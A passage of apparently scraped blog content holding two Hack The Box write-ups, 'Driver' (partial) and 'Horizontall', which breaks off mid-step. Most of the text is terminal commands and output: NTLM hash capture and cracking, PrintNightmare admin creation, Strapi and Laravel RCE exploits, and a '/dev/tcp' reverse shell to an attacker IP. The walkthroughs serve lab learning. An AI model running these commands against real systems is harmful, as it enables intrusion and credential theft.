. # Nmap done at Thu Feb 7 21:48:32 2022 -- 1 IP address (1 host up) scanned in 151.91 seconds Just don\u0026rsquo;t forget to scan all ports (with -p- switch) in order not to miss that port 5985.\nUpon opening the web page, the site asked for HTTP Basic Authentication.\n II. Failed enumeration attempts At first glance, I didn\u0026rsquo;t bother with the login form and looked for other endpoints instead. However, looking at Gobuster scan result:\n# Port 80 scan result /images (Status: 403) [Size: 1233] /%c3%90%c2%a0%c3%91%c2%83%c3%91%c2%81%c3%91%c2%81%c3%90%c2%ba%c3%90%c2%b8%c3%90%c2%b9%c3%90%c2%9f%c3%90%c2%b8%c3%91%c2%82%c3%90%c2%be%c3%90%c2%bd (Status: 400) [Size: 324] /%20%09adobe%20photoshop%20elements%205 (Status: 400) [Size: 324] /%09tuneup (Status: 400) [Size: 324] /alcohol120%1952722c (Status: 400) [Size: 324] And dirbuster result:\n \u0026hellip; eventually, I gave up on this attack vector. Then I went to SMB and tried my luck on it.\n┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ smbclient --no-pass -L //10.10.11.106 session setup failed: NT_STATUS_ACCESS_DENIED  ┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ smbclient -U guest -L //10.10.11.106/ Enter WORKGROUP\\guest password: session setup failed: NT_STATUS_ACCOUNT_DISABLED To my surprise, guest account was disabled and anonymous access was denied while this\u0026rsquo;s supposed to be an easy box. Placing a bet on outdated software + public exploits combo also turned out to be a mistake shortly after:\nmsf6 exploit(windows/smb/cve_2020_0796_smbghost) \u0026gt; exploit  [*] Started reverse TCP handler on 10.10.14.8:9999 [*] 10.10.11.106:445 - Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [-] 10.10.11.106:445 - Exploit aborted due to failure: not-vulnerable: The target is not exploitable. \u0026#34;set ForceExploit true\u0026#34; to override check result. [*] Exploit completed, but no session was created. # From https://github.com/ZecOps/CVE-2020-0796-RCE-POC $ python3 SMBleedingGhost.py 10.10.11.106 10.10.14.8 8080 CVE-2020-0796 Remote Code Execution POC (c) 2020 ZecOps, Inc.  Target is not vulnerable Some other enumeration attepmts I learnt from HackTricks also felt short as they returned no novel information.\nIII. Successful enumeration attempts Afterwards, somehow I followed my nose and randomly typed admin - password into the HTTP simple login form, as well as admin - pass. In the third attempt with admin - admin, it happily got me through:\n Next, I maniacally clicked on whatever seems clickable. In spite of that, there was nothing but this firmware update page:\n Through Burp Suite, the page appeared to be a fundamental file uploading page, directly via HTTP POST request, with no validation whatsoever. Wappalyzer suggested a PHP backend, therefore, I tried a PHP reverse shell along with some other web payloads and Windows payloads. Nonetheless, nothing worked, which compelled us to seek out for a better attack vector.\nBut hold on, files, with SMB\u0026hellip; At that moment, my mind finally pieced the clues together and the answer suddenly dawned on me: How about a SCF file attack?\nThis straght-to-the-point guide from Pentestlab covered all knowledge needed to start diving into exploiting the vulnerability. Thus, just strictly follow the guide and we got some sweet hashes like this:\nmsf6 auxiliary(server/capture/smb) \u0026gt; exploit [*] Auxiliary module running as background job 1.  [*] Server is running. Listening on 10.10.14.21:445 msf6 auxiliary(server/capture/smb) \u0026gt; [+] Received SMB connection on Auth Capture Server! [SMB] NTLMv2-SSP Client : 10.10.11.106 [SMB] NTLMv2-SSP Username : DRIVER\\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:7dddc33ef0e24ca4:0365b04698b0c7b26f59c27bd7ceae61:0101000000000000007e17dbda1bd801835bdaa9e8a14d09000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800007e17dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000   [+] Received SMB connection on Auth Capture Server! [SMB] NTLMv2-SSP Client : 10.10.11.106 [SMB] NTLMv2-SSP Username : DRIVER\\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:e6fbeb49363872ac:cc3944c26e2cb37a604ed94691a61e3a:01010000000000008014b0dbda1bd80185625afe652e0d74000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008014b0dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000  # and several more that looks pretty much alike Because I didn\u0026rsquo;t know which one was the \u0026ldquo;legitimate\u0026rdquo; hash, using some small scripting tricks I dumped them all into separate files, so as to check them using hashid.\n┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ hashid userhash --File \u0026#39;userhash\u0026#39;-- Analyzing \u0026#39;tony::DRIVER:7dddc33ef0e24ca4:0365b04698b0c7b26f59c27bd7ceae61:0101000000000000007e17dbda1bd801835bdaa9e8a14d09000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000\u0026#39; [+] NetNTLMv2 Analyzing \u0026#39;400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800007e17dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a00100\u0026#39; [+] Unknown hash Analyzing \u0026#39;0000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000\u0026#39; [+] Unknown hash --End of file \u0026#39;userhash\u0026#39;-- ┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ hashid userhash2 --File \u0026#39;userhash2\u0026#39;-- Analyzing \u0026lt;REDACTED\u0026gt; [+] NetNTLMv2 --End of file \u0026#39;userhash2\u0026#39;-- IV. Foothold You will miss all the fun if I let on all the real credentials. For that reason, critical credentials will be redacted from this point onwards.\nA question is, where to use all these hashes? An obvious answer is via the WinRM 5985 port.\nNext question would be, \u0026ldquo;how\u0026rdquo;? Well, let\u0026rsquo;s go for a must-have tool - evil-winrm. Installing instructions are all clearly put accross in its README file, so I\u0026rsquo;ll not go into details here.\nChecking for options evil-winrm provides, there\u0026rsquo;s a -H switch to log in with NTML hash. However\u0026hellip;\n$ evil-winrm -i driver.htb -u tony -H \u0026#34;\u0026lt;REDACTED_LEGITIMATE_HASH\u0026gt;\u0026#34;  Evil-WinRM shell v3.3  Error: Invalid hash format It didn\u0026rsquo;t work, and god knows why. Consequently, it was unavoidable to face the hassle of cracking this hash on my potato machine. Thankfully the hash didn\u0026rsquo;t take donkey\u0026rsquo;s years to crack.\n$ john userhash2 Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst Proceeding with incremental:ASCII \u0026lt;REDACTED_TONY_PASSWORD\u0026gt; (tony) 1g 0:00:02:44 DONE 3/3 (2022-02-07 01:43) 0.006064g/s 957216p/s 957216c/s 957216C/s labzter..lilton3 Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed. With the password now in own hand, it\u0026rsquo;s a piece of cake getting a shell callback.\n$ evil-winrm -i driver.htb -u tony -p \u0026lt;REDACTED_TONY_PASSWORD\u0026gt;  Evil-WinRM shell v3.3  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; And the rock stable shell of evil-winrm easily led me to the user flag:\n*Evil-WinRM* PS C:\\Users\\tony\\Desktop\u0026gt; Get-ChildItem    Directory: C:\\Users\\tony\\Desktop   Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/7/2022 5:21 AM 34 user.txt V. Privilege Escalation First and foremost, WinPEAS all the way through.\nOn our attacker machine:\nwget https://github.com/carlospolop/PEASS-ng/releases/download/20220206/winPEASany.exe -O finding.exe On the remote shell:\nInvoke-WebRequest -URI http://10.10.14.21/finding.exe -UseBasicParsing -OutFile finding.exe Carefully examining WinPEAS result, we cannot see many exeptional things showed up, but the most notable one is probably a runing service named spoolsv.exe.\nIn short, spoolsv signifies the existence of a printer and printing drivers, which reminds us about the unforgettable PrintNightmare - a vulnerability chain comprises of CVE-2021-34527, CVE-2021-34481 (for RCE) and CVE-2021-1675 (for local privilege escalation). Unquestionably, we will use the last one.\nA quick Github search led me to a C# POC that seems to work.\n  However, its setup called for an abundance of time, so I gave it a miss and tried out this simple script instead.\n  Without further ado, I straghtforwardly followed the README and it smoothly did the trick.\n*Evil-WinRM* PS C:\\Users\\tony\\Downloads\u0026gt; Invoke-Nightmare [+] using default new user: adm1n [+] using default new password: P@ssw0rd [+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = \u0026#34;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll\u0026#34; [+] added user as local administrator [+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll At that point, what\u0026rsquo;s left was to log in using adm1n account (which has Administrator privilege) and snatch the flag.\nevil-winrm -i driver.htb -u adm1n -p P@ssw0rd Root flag can be found effortlessly at Administrator\u0026rsquo;s Desktop folder.\n*Evil-WinRM* PS C:\\Users\\Administrator\u0026gt; cd C:\\Users\\Administrator\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; ls    Directory: C:\\Users\\Administrator\\Desktop   Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/8/2022 5:04 AM 34 root.txt And that\u0026rsquo;s all. Hope you\u0026rsquo;ve enjoyed this vastly informative box.\n","permalink":"https://git-akihakune.github.io/blog/driver/","summary":"A writeup for Driver machine from Hack The Box","title":"Hack The Box - Driver"},{"content":"I. Scanning First things first, as per usual, a nmap scan:\n# Nmap 7.92 scan initiated Fri Jan 14 02:48:59 2022 as: nmap -sC -sV -oN nmap.txt 10.10.11.105 Nmap scan report for 10.10.11.105 Host is up (0.039s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 02:49:13 2022 -- 1 IP address (1 host up) scanned in 13.50 seconds Notice this line?\nhttp-title: Did not follow redirect to http://horizontall.htb So we have to add an additional entry to our /etc/hosts file, something like this:\n10.10.11.105 horizontall.htb Rerun nmap again, and here\u0026rsquo;s the result:\n# Nmap 7.92 scan initiated Fri Jan 14 02:59:54 2022 as: nmap -sC -sV -oN nmap.txt 10.10.11.105 Nmap scan report for horizontall.htb (10.10.11.105) Host is up (0.042s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: horizontall Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 03:00:05 2022 -- 1 IP address (1 host up) scanned in 10.60 seconds A full port scan also didn\u0026rsquo;t reveal anything, so i manually opened it in a browser: Nothing was clickable. Also, here\u0026rsquo;s what gobuster returned us:\n$ gobuster dir -r -u http://horizontall.htb -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== 2022/01/14 03:18:57 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 403) [Size: 178] /css (Status: 403) [Size: 178] /js (Status: 403) [Size: 178]  =============================================================== 2022/01/14 03:25:24 Finished =============================================================== Nothing new, isn\u0026rsquo;t it? I also check the javascript source code but seems like nothing novel showed up.\nAt this point, I remembered a small ctf trick - if the challenge calls for any amendment in /etc/hosts file, the answer must lie somewhere among the subdomains. Therefore, I set up a subdomain fuzzer like this:\nwfuzz --oF wfuzz -c -f wfuzz.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#34;http://horizontall.htb\u0026#34; -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; --hc 301 And it perfectly worked:\n$ wfuzz --oF wfuzz -c -f wfuzz.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#34;http://horizontall.htb\u0026#34; -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; --hc 301 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ********************************************************  Target: http://horizontall.htb/ Total requests: 114441  ===================================================================== ID Response Lines Word Chars Payload =====================================================================  000000001: 200 1 L 43 W 901 Ch \u0026#34;www\u0026#34; 000047093: 200 19 L 33 W 413 Ch \u0026#34;api-prod\u0026#34;  Total time: 641.3004 Processed Requests: 114441 Filtered Requests: 114439 Requests/sec.: 178.4514 Takes about 10 minutes with a mediocre virtual machine. However, we have found a new attack surface - that api-prod endpoint.\nBut all else aside, we must add that enpoint to our /etc/hosts file first.\n10.10.11.105 api-prod.horizontall.htb II. API attack Upon opening that endpoint in a browser, here\u0026rsquo;s what we have: Well, thanks I guess?\nWe will follow the exact same procedure for the new API endpoint. Here is the Gobuster result:\n/reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854] /Reviews (Status: 200) [Size: 507] /Users (Status: 403) [Size: 60] /Admin (Status: 200) [Size: 854] /REVIEWS (Status: 200) [Size: 507] /%C0 (Status: 400) [Size: 69] /%C0~ (Status: 400) [Size: 69] /%C0.bak (Status: 400) [Size: 69] /%C0.bak2 (Status: 400) [Size: 69] /%C0.old (Status: 400) [Size: 69] /%C0.1 (Status: 400) [Size: 69] /.%C0.swp (Status: 400) [Size: 69] As you can see, there are many interesting things to check here. But first, let\u0026rsquo;s get to /admin endpoint.\n So the technology behind is strapi. A quick searchsploit result revealed a critical RCE vulnerability.\n$ searchsploit strapi ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Strapi 3.0.0-beta - Set Password (Unauthenticated) | multiple/webapps/50237.py Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated) | multiple/webapps/50238.py Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results Choose one that you like, then simply execute it. Here, I used 50239.py:\n$ python3 50239.py http://api-prod.horizontall.htb [+] Checking Strapi CMS Version running [+] Seems like the exploit will work!!! [+] Executing exploit   [+] Password reset was successfully [+] Your email is: admin@horizontall.htb [+] Your new credentials are: admin:SuperStrongPassword1 [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODc3NTg2LCJleHAiOjE2NDY0Njk1ODZ9.p_uvCIHcKXwruPv8na6MVpU-aLInNKphFDvOh7zYs5U   $\u0026gt; However, running a command resulted in an error:\n$\u0026gt; id [+] Triggering Remote code executin [*] Rember this is a blind RCE do not expect to see output {\u0026#34;statusCode\u0026#34;:400,\u0026#34;error\u0026#34;:\u0026#34;Bad Request\u0026#34;,\u0026#34;message\u0026#34;:[{\u0026#34;messages\u0026#34;:[{\u0026#34;id\u0026#34;:\u0026#34;An error occurred\u0026#34;}]}]} At first I was doubtful about some shoddy programming. However, it really did successfully make a call back. Therefore, I spinned up an one liner reverse shell like this:\n#!/bin/sh  sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.13/9000 0\u0026gt;\u0026amp;1 And download it to target machine.\n$\u0026gt; wget 10.10.16.13/rv.sh [+] Triggering Remote code executin [*] Rember this is a blind RCE do not expect to see output {\u0026#34;statusCode\u0026#34;:400,\u0026#34;error\u0026#34;:\u0026#34;Bad Request\u0026#34;,\u0026#34;message\u0026#34;:[{\u0026#34;messages\u0026#34;:[{\u0026#34;id\u0026#34;:\u0026#34;An error occurred\u0026#34;}]}]} We can clearly see it was successfully transferred from our attacking machine:\n$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.105 - - [03/Feb/2022 03:55:37] \u0026#34;GET /rv.sh HTTP/1.1\u0026#34; 200 - And upon triggering the script:\n$\u0026gt; bash rv.sh [+] Triggering Remote code executin [*] Rember this is a blind RCE do not expect to see output We got a reverse shell:\n$ nc -lvnp 9000 listening on [any] 9000 ... connect to [10.10.16.13] from (UNKNOWN) [10.10.11.105] 43566 sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1001(strapi) gid=1001(strapi) groups=1001(strapi) III. User flag After a 5-second recon, I relized that strapi user had sufficient permission to read the user flag at /home/developer/user.txt.\n$ ls /home developer $ cd /home/developer $ ls -al total 108 drwxr-xr-x 8 developer developer 4096 Aug 2 2021 . drwxr-xr-x 3 root root 4096 May 25 2021 .. lrwxrwxrwx 1 root root 9 Aug 2 2021 .bash_history -\u0026gt; /dev/null -rw-r----- 1 developer developer 242 Jun 1 2021 .bash_logout -rw-r----- 1 developer developer 3810 Jun 1 2021 .bashrc drwx------ 3 developer developer 4096 May 26 2021 .cache -rw-rw---- 1 developer developer 58460 May 26 2021 composer-setup.php drwx------ 5 developer developer 4096 Jun 1 2021 .config drwx------ 3 developer developer 4096 May 25 2021 .gnupg drwxrwx--- 3 developer developer 4096 May 25 2021 .local drwx------ 12 developer developer 4096 May 26 2021 myproject -rw-r----- 1 developer developer 807 Apr 4 2018 .profile drwxrwx--- 2 developer developer 4096 Jun 4 2021 .ssh -r--r--r-- 1 developer developer 33 Feb 3 08:06 user.txt lrwxrwxrwx 1 root root 9 Aug 2 2021 .viminfo -\u0026gt; /dev/null Or, to be precise, anyone on the box can read that user.txt file. Just cat it out and we got the user flag.\nIV. Privilege Escalation Or a seem-very-real rabbit hole that I felt into. If you are not interested, you can jump to real privilege escalation section.\nHere\u0026rsquo;s the starting point of a miserable failure:\n$ uname -a Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux And we can find so many \u0026ldquo;potential\u0026rdquo; payloads with just that information.\n$ searchsploit linux kernel 4.15.0 130 ⨯ ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Linux Kernel (Solaris 10 / \u0026lt; 5.10 138888-01) - Local Privilege Escalation | solaris/local/15962.c Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 \u0026lt; 11 / Whitebox 4 / CentOS 4) - \u0026#39;sock_sendpage()\u0026#39; Ring0 Privilege Escalation (5) | linux/local/9479.c Linux Kernel 2.6.19 \u0026lt; 5.9 - \u0026#39;Netfilter Local Privilege Escalation | linux/local/50135.c Linux Kernel 4.10 \u0026lt; 5.1.17 - \u0026#39;PTRACE_TRACEME\u0026#39; pkexec Local Privilege Escalation | linux/local/47163.c Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (cron Method) | linux/local/47164.sh Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (dbus Method) | linux/local/47165.sh Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (ldpreload Method) | linux/local/47166.sh Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (polkit Method) | linux/local/47167.sh Linux Kernel 4.8.0 UDEV \u0026lt; 232 - Local Privilege Escalation | linux/local/41886.c Linux Kernel \u0026lt; 4.15.4 - \u0026#39;show_floppy\u0026#39; KASLR Address Leak | linux/local/44325.c Linux Kernel \u0026lt; 4.16.11 - \u0026#39;ext4_read_inline_data()\u0026#39; Memory Corruption | linux/dos/44832.txt Linux Kernel \u0026lt; 4.17-rc1 - \u0026#39;AF_LLC\u0026#39; Double Free | linux/dos/44579.c ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results After wasting an hour of mine to \u0026ldquo;trial and error\u0026rdquo; most of those exploits, I came to a painful conclusion that these are no use in this case.\nV. Real privilege escalation - if only Things got back to their right tracks after I crawled out of that rabbit hole. At least, that\u0026rsquo;s what I want to say, but no.\nIt all started from this list of opening ports:\n$ ss -lntup Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 0 128 127.0.0.1:8000 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:1337 0.0.0.0:* users:((\u0026#34;node\u0026#34;,pid=1750,fd=31)) tcp LISTEN 0 128 [::]:80 [::]:* tcp LISTEN 0 128 [::]:22 [::]:* In my opinion, that 1337 port seems extremely suspicious. However, after a bit of SSH tunneling, I realized that it was only the API endpoint that we discovered earlier.\nOn the other hand, that port 3306 was the real culprit.\nHere is another very useful command that turned out to be a menace this time:\n$ grep -Rnw -e \u0026#34;password\u0026#34; environments/production/database.json:13: \u0026#34;password\u0026#34;: \u0026#34;${process.env.DATABASE_PASSWORD || \u0026#39;\u0026#39;}\u0026#34;, environments/development/database.json:12: \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34; environments/staging/database.json:13: \u0026#34;password\u0026#34;: \u0026#34;${process.env.DATABASE_PASSWORD || \u0026#39;\u0026#39;}\u0026#34;, Without a second thought, I instantly cat out that development/database.json file.\n{  \u0026#34;defaultConnection\u0026#34;: \u0026#34;default\u0026#34;,  \u0026#34;connections\u0026#34;: {  \u0026#34;default\u0026#34;: {  \u0026#34;connector\u0026#34;: \u0026#34;strapi-hook-bookshelf\u0026#34;,  \u0026#34;settings\u0026#34;: {  \u0026#34;client\u0026#34;: \u0026#34;mysql\u0026#34;,  \u0026#34;database\u0026#34;: \u0026#34;strapi\u0026#34;,  \u0026#34;host\u0026#34;: \u0026#34;127.0.0.1\u0026#34;,  \u0026#34;port\u0026#34;: 3306,  \u0026#34;username\u0026#34;: \u0026#34;developer\u0026#34;,  \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34;  },  \u0026#34;options\u0026#34;: {}  }  } } Little did I know, all these very legit credentials are traps. I happily connected to the database, browsing around a bit, and eventually got something really promising.\n$ mysql -h 127.0.0.1 -P 3306 -u developer -p strapi --password=\u0026#34;#J!:F9Zt2u\u0026#34; -e \u0026#34;SELECT * FROM strapi_administrator\u0026#34; mysql: [Warning] Using a password on the command line interface can be insecure. id username email password resetPasswordToken blocked 3 admin admin@horizontall.htb $2a$10$Z/5DNUBoQeb0hOBmD3mlous9fju9gK3FEGOVKoe.XRw4TNCTgjqu. NULL NULL I went through hell to crack that password, only to belatedly realize that the hash was notoriously hard to brute force due to its high hashing time. Nevertheless, I managed to crack it.\nadmin\tSuperStrongPassword1 Why does this password sounds peculiarly familiar\u0026hellip;\nA flashback suddenly dawned on me - it was the dummy admin account that our strapi exploit script made from start! All those work, were in vain\u0026hellip; What a memorable experience.\nVI. Real privilege escalation There still is another strange opening port - port 8000. After another bit of port forwarding:\nssh -i key/id_rsa -L 9999:127.0.0.1:8000 strapi@horizontall.htb Then access it through localhost:9999, we get a fresh Laravel page. Notice this small line in the bottom right corner?\nLaravel v8 (PHP v7.4.18) Several vulnerabilities were found in no time:\n$ searchsploit laravel 8 ------------------------------------------------------------------------------------- ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------- --------------------------------- Aimeos Laravel ecommerce platform 2021.10 LTS - \u0026#39;sort\u0026#39; SQL injection | php/webapps/50538.txt Laravel - \u0026#39;Hash::make()\u0026#39; Password Truncation Security | multiple/remote/39318.txt Laravel 8.4.2 debug mode - Remote code execution | php/webapps/49424.py Laravel Nova 3.7.0 - \u0026#39;range\u0026#39; DoS | php/webapps/49198.txt PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forgery (CSRF) | php/webapps/50525.txt UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read | php/webapps/48166.txt UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload | php/webapps/46389.py ------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Mostly are Python 3 exploits. We can do port forwarding, or directly load the exploit to the server. However, given that the server has Python3:\nstrapi@horizontall:~$ python3 -V Python 3.6.9 The latter seems better. However\u0026hellip;\nstrapi@horizontall:~$ python3 rt.py http://127.0.0.1:8000 /var/www/html/laravel/storage/logs/laravel.log \u0026#39;whoami\u0026#39;  Exploit... Traceback (most recent call last):  File \u0026#34;/usr/lib/python3/dist-packages/urllib3/connectionpool.py\u0026#34;, line 601, in urlopen  chunked=chunked)  File \u0026#34;/usr/lib/python3/dist-packages/urllib3/connectionpool.py\u0026#34;, line 387, in _make_request  six.raise_from(e, None)  File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 3, in raise_from  File \u0026#34;/usr/lib/python3/dist-packages/urllib3/connectionpool.py\u0026#34;, line 383, in _make_request  httplib_response = conn.getresponse()  File \u0026#34;/usr/lib/python3.6/http/client.py\u0026#34;, line 1373, in getresponse  response.begin()  File \u0026#34;/usr/lib/python3.6/http/client.py\u0026#34;, line 311, in begin  version, status, reason = self._read_status()  File \u0026#34;/usr/lib/python3.6/http/client.py\u0026#34;, line 280, in _read_status  raise RemoteDisconnected(\u0026#34;Remote end closed connection without\u0026#34; http.client.RemoteDisconnected: Remote end closed connection without response \u0026hellip; the exploit refused to work\u0026hellip; And thus, a quick search led me to a year old Github repo.\nstrapi@horizontall:~$ python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 id [i] Trying to clear logs [+] Logs cleared [+] PHPGGC found. Generating payload and deploy it to the target [+] Successfully converted logs to PHAR [+] PHAR deserialized. Exploited  uid=0(root) gid=0(root) groups=0(root)  [i] Trying to clear logs [+] Logs cleared This time, it worked perfectly. Hence, dive into the real thing, let\u0026rsquo;s copy /bin/bash to some other directory, change its owner and set SUID permission for it.\nstrapi@horizontall:~$ cp /bin/bash ~ strapi@horizontall:~$ python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 \u0026#34;chown root:root /opt/strapi/bash; chmod +s /opt/strapi/bash\u0026#34; [i] Trying to clear logs [+] Logs cleared [+] PHPGGC found. Generating payload and deploy it to the target [+] Successfully converted logs to PHAR [i] There is no output [i] Trying to clear logs [+] Logs cleared And just like that, we now have root access.\nstrapi@horizontall:~$ ls bash myapi strapi@horizontall:~$ ./bash -p bash-4.4# id uid=1001(strapi) gid=1001(strapi) euid=0(root) egid=0(root) groups=0(root),1001(strapi) VII. Extra For the time of writing (nearly 5 months after the box release), there\u0026rsquo;s another novel, safe and reliable method to get root access via CVE-2021-4034. This is probably not intentional, but it worked nonetheless.\nFrom our attacker machine:\nwget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip -O polkit.zip Load that to server machine, make it there, and get root.\nstrapi@horizontall:~$ wget http://10.10.16.13/polkit.zip --2022-02-03 12:55:45-- http://10.10.16.13/polkit.zip Connecting to 10.10.16.13:80... connected. HTTP request sent, awaiting response... l200 OK Length: 6457 (6.3K) [application/zip] Saving to: ‘polkit.zip’  polkit.zip 100%[===============================================\u0026gt;] 6.31K --.-KB/s in 0.04s  2022-02-03 12:55:45 (175 KB/s) - ‘polkit.zip’ saved [6457/6457]  strapi@horizontall:~$ unzip polkit.zip 